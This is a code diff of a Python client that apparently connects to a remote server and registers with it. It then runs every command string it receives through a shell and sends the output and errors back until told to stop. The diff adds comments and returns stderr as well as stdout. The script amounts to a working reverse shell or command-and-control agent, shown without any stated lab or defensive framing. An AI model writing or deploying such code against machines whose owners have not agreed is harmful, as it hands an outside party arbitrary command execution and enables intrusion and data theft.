@@ -13,19 +13,30 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     registration_request = CLIENT_HOST
     s.sendall(bytes(registration_request, encoding='utf-8'))
 
+    # Running until "stop" is sent from the server.
     while True:
+
+        # Wait, and recieve the message from the server.
         message = s.recv(1024).decode('utf-8')
+
+        # If the message is stop, stop the session.
         if message == "stop":
             break
+
+        # If the message exist, execute it.
         if message:
-            print(f"Execute this: \"{message}\"")
+            print(message)
             try:
                 result = subprocess.run(message.split(), capture_output=True, text=True, shell=True)
             except:
+                # Handle errors
                 s.sendall(bytes("Not a valid command", encoding='utf-8'))
                 continue
-            s.sendall(bytes(result.stdout.strip(), encoding='utf-8'))
+
+            # Send the stdout, and stderr to the server.
+            response = result.stdout.strip() + "\n" + result.stderr.strip()
+            s.sendall(bytes(response, encoding='utf-8'))
         else:
-            print(f"Error with recieving command")
+            print(f"Error with recieving message")
 
 print("Done")
